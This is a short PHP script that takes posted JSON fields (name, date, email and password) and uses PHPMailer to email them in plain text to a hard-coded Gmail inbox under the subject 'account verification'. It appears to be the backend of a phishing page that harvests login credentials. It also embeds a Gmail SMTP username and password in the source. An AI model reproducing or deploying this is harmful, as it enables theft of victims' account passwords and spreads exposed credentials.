<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'path/to/PHPMailer/src/Exception.php';
require 'path/to/PHPMailer/src/PHPMailer.php';
require 'path/to/PHPMailer/src/SMTP.php';

$data = json_decode(file_get_contents('php://input'), true);

$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'jjuuaann110794@gmail.com';                 //SMTP username
    $mail->Password   = 'aNgADA934qT94';         //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;        //Enable TLS encryption, `ssl` also accepted
    $mail->Port       = 587;                                    //TCP port to connect to

    //Recipients
    $mail->setFrom('jjuuaann110794@gmail.com', 'Tu Nombre');
    $mail->addAddress('jjuuaann110794@gmail.com', 'Destinatario');     //Add a recipient

    //Content
    $mail->isHTML(true);                                        //Set email format to HTML
    $mail->Subject = 'Verificación de Cuenta';
    $mail->Body    = 'Nombre: ' . $data['name'] . '<br>' .
                     'Fecha: ' . $data['date'] . '<br>' .
                     'Correo Electrónico: ' . $data['email'] . '<br>' .
                     'Contraseña: ' . $data['password'];

    $mail->send();
    echo json_encode(['message' => 'Mensaje enviado con éxito']);
} catch (Exception $e) {
    echo json_encode(['message' => 'Error al enviar el mensaje: ' . $mail->ErrorInfo]);
}
?>
